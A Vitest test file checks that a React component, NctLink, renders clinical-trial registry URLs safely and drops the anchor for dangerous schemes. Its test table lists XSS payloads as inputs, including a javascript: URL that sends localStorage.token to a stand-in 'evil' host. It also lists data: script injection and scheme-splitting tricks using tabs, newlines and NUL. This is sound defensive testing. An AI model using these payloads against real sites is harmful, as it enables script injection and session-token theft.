// The guard where the URL reaches the DOM (#406).
//
// This renders `NctLink` and asserts on the markup. The first version of this
// test read TrialDetailPage.tsx with regexes instead, and review showed it
// passed on `href={data.link || ""}` and on a refactor that bound the raw value
// to a local -- two realistic ways to reintroduce the exact finding -- while
// failing on three harmless rewrites. It recognised one spelling of the fix,
// not the property.
//
// No jsdom is needed: `renderToStaticMarkup` runs under this project's
// `environment: "node"`, and react-dom is already a runtime dependency.
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { NctLink } from "./TrialDetailPage";

const render = (link: string | null | undefined) =>
  renderToStaticMarkup(<NctLink link={link} studyId="NCT01" />);

describe("NctLink", () => {
  it("links a real registry URL", () => {
    const html = render("https://clinicaltrials.gov/study/NCT01");

    expect(html).toContain('href="https://clinicaltrials.gov/study/NCT01"');
    expect(html).toContain("NCT01");
  });

  it("keeps a legacy http registry link", () => {
    expect(render("http://clinicaltrials.gov/ct2/show/NCT01")).toContain(
      'href="http://clinicaltrials.gov/ct2/show/NCT01"',
    );
  });

  it.each([
    ["javascript:", "javascript:fetch('//evil/?t='+localStorage.token)"],
    ["data:", "data:text/html,<script>alert(1)</script>"],
    ["vbscript:", "vbscript:msgbox(1)"],
    ["blob:", "blob:https://evil.example/x"],
    ["protocol-relative", "//evil.example/x"],
    ["backslash authority", "/\\evil.example/x"],
    // The separator tricks are the reason the helper compares the *parsed*
    // protocol: the WHATWG parser strips these from anywhere in the input, so a
    // literal string check on the raw value would miss every one of them.
    ["tab-split scheme", "java\tscript:alert(1)"],
    ["newline-split scheme", "java\nscript:alert(1)"],
    ["carriage-return-split scheme", "java\rscript:alert(1)"],
    ["mixed case", "JaVaScRiPt:alert(1)"],
    ["leading NUL", "\u0000javascript:alert(1)"],
    ["leading vertical tab", "\u000bjavascript:alert(1)"],
  ])("renders no anchor at all for %s", (_label, link) => {
    const html = render(link);

    // Not "no javascript: in the href" -- no anchor at all. An `<a>` without an
    // href still paints link styling over a control that does nothing.
    expect(html).not.toContain("<a ");
    expect(html).not.toContain("href=");
    expect(html).toContain("NCT01");
  });

  it.each([[null], [undefined], [""], ["   "]])(
    "renders plain text rather than an empty link for %s",
    (link) => {
      const html = render(link as string | null | undefined);

      expect(html).not.toContain("<a ");
      expect(html).toContain("NCT01");
    },
  );

  it("does not rely on React to neutralise the scheme", () => {
    // React 19 (this repo) rewrites `javascript:` in an href to a throwing URL,
    // so a regression here would not execute -- but it WOULD still render an
    // anchor, and `data:` is passed through untouched. CancerBot's ui.v2 is on
    // React 18, where `javascript:` only warns and renders (cancerbot#5289).
    // Either way the assertion is on our own guard: no anchor, for both.
    expect(render("javascript:alert(1)")).not.toContain("<a ");
    expect(render("data:text/html,<b>x</b>")).not.toContain("<a ");
  });
});
